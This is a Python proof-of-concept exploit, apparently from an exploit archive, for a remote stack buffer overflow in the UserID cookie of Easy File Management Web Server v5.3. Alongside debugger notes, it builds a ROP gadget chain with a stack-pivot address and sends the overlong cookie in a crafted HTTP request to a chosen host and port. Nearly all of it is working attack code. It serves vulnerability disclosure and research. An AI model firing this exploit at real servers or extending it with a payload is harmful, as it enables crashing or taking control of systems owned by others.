"""
Full title:         Easy File Management Web Server v.5.3 - Cookie Stack Buffer Overflow (PoC)
Exploit Author:     Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:    http://www.efssoft.com
Download:           https://www.exploit-db.com/apps/a46371c665d7c85689b47534904bc3f1-efmsetup.exe
Version:            v.5.3
Tested on:          Windows 10 Pro x64 v.1909 Build 18363.418
Category:           remote exploit
Platform:           windows
NOTE:               https://www.rcesecurity.com/2014/05/easy-file-management-web-server-v5-3-exploit-kung-fu/
"""
#!/usr/bin/python
import struct, socket, sys, os

host="127.0.0.1"
port=80

buf_max_sixe = 3800
edx_offset = 80
# BAD CHARS: \x00\x3b

"""
EDI (0x054e98b8) points at offset 80 in normal pattern (length 3720)
EDX contains normal pattern : 0x37634136 (offset 80)
ESI (0x054e98a8) points at offset 64 in normal pattern (length 3736)
ECX (0x054e98b8) points at offset 80 in normal pattern (length 3720)

PUSH EBX
PUSH EBX
MOV ECX,EDI
CALL DWORD PTR DS:[EDX+28] <--- CRASH (Load what is pointed at EDX+28 then call it)
we need to find a pointer to the string of the stack pivot address value (in non DEP enviroment we can be "near" it and execute all the instruction in between)


0x1001a6ff : {pivot 264 / 0x108} :  # POP EBP # POP EBX # ADD ESP,100 # RETN    ** [ImageLoad.dll] **   |   {PAGE_EXECUTE_READ}
!mona find -s '\xff\xa6\x01\x10' -cm aslr=false,rebase=false -cpb '\x00\x3b'

0x033c1a2a : '\xff\xa6\x01\x10' | ascii {PAGE_READONLY}

"""

def create_rop_nop():
    rop_gadgets = [
    0x1001c025, # 0x1001c025 :  # POP EBX # RETN    ** [ImageLoad.dll] **   |   {PAGE_EXECUTE_READ}
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
    
buf = ""
buf += create_rop_nop() * edx_offset 
buf += struct.pack("<I", 0x33C1A02) # stack pivot >= 140; 0x1001a6ff : {pivot 264 / 0x108} :  # POP EBP # POP EBX # ADD ESP,100 # RETN    ** [ImageLoad.dll] **   |   {PAGE_EXECUTE_READ}
# 0x1001a6ff can be found at 0x033c1a2a; 0x033c1a2a - 28 = 0x33C1A02; it will also compensate the POP EBX in the ROP NOP

buf += "B" * (buf_max_sixe-len(buf))

req="GET /vfolder.ghp HTTP/1.1\r\n"
req+="User-Agent: Mozilla/4.0\r\n"
req+="Host:" + host + ":" + str(port) + "\r\n"
req+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req+="Accept-Language: en-us\r\n"
req+="Accept-Encoding: gzip, deflate\r\n"
req+="Referer: http://" + host + "/\r\n"
req+="Cookie: SESSIONID=1337; UserID=" + buf + "; PassWD=;\r\n"
req+="Conection: Keep-Alive\r\n\r\n"

print "[*] Connecting to Host " + host + "..."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)

print "[*] Sending malformed request..."
s.send(req)

print "[!] Exploit has been sent!\n"
s.close()